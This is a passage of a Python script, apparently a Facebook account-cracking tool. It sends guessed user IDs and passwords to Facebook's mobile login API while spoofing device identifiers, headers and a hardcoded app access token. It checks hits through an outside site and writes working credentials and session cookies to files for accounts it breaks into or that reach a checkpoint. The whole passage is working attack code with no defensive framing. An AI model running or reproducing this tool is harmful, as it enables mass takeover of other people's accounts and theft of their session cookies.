                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':uid,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent': random.choice(get_uapx_list),
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po: 
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        k = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={uid}"
                                        resp = requests.get(k).text
                                        if 'live' in resp:
                                            print(f"\r\r{W}[{M}●{W}]{R}―{W}[{G}OK{W}] {R}:  {G2}{uid} {A}| {G2}{pas} ")
                                            print(f'\r\r{W}[{M}●{W}]{R}―{W}[{G}COOKIE{W}]{R} : {W} '+coki)
                                            open('/sdcard/RAFAT-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                            oks.append(uid)
                                            break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f"\r\r{W}[{M}●{W}]{R}―{W}[{G}OK{W}] {R}:  {R}{ids} {A}| {G2}{pas} ")
                                                open('/sdcard/RAFAT-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                print(e)
#━━━━━━━━━━━━━━━━ END ━━━━━━━━━━━━━━━━━━━━━#
RAFAT()
